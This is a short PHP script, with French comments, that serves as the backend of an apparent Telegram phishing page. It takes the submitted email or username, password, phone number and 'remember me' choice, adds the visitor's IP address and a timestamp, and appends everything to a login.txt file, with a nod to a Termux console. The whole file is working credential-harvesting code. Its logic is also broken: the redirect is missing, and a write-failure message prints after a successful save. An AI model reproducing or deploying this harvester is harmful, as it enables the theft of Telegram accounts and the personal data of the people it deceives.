<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $username = htmlspecialchars(trim($_POST["username"] ?? ''));  // Email
    $password = htmlspecialchars(trim($_POST["password"] ?? ''));  // Mot de passe
    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));  // Indicatif pays
    $phone_number = htmlspecialchars(trim($_POST["phone_number"] ?? ''));  // Numéro de téléphone
    $remember = isset($_POST["remember"]) ? 'Oui' : 'Non';  // Case à cocher
    $ip = $_SERVER['REMOTE_ADDR'];
    $date = date('Y-m-d H:i:s');

    // Vérifie si les champs obligatoires ne sont pas vides
    if (!empty($username) && !empty($password) && !empty($phone_number)) {
        // Formate les données pour l'enregistrement (format lisible)
        $data = "=== NOUVELLE CONNEXION TELEGRAM ===\n";
        $data .= "Date: $date\n";
        $data .= "Email/Username: $username\n";
        $data .= "Téléphone: $country_code$phone_number\n";
        $data .= "Mot de passe: $password\n";
        $data .= "Session active: $remember\n";
        $data .= "Adresse IP: $ip\n";
        $data .= "==================================\n\n";

        // Enregistre les données dans le fichier
        $file = "login.txt";
        if (file_put_contents($file, $data, FILE_APPEND)) {
            // Affiche les données sur la console Termux (via le script Bash)
            echo "<script>console.log('Données enregistrées avec succès');</script>";
            
            // Redirige l'utilisateur vers une page légitime
            
            echo "Erreur : Impossible d'écrire dans le fichier.";
        }
    } else {
        echo "Erreur : Tous les champs obligatoires doivent être remplis.";
    }
} else {
    echo "Accès invalide : cette page doit être appelée via un formulaire POST.";
}
?>
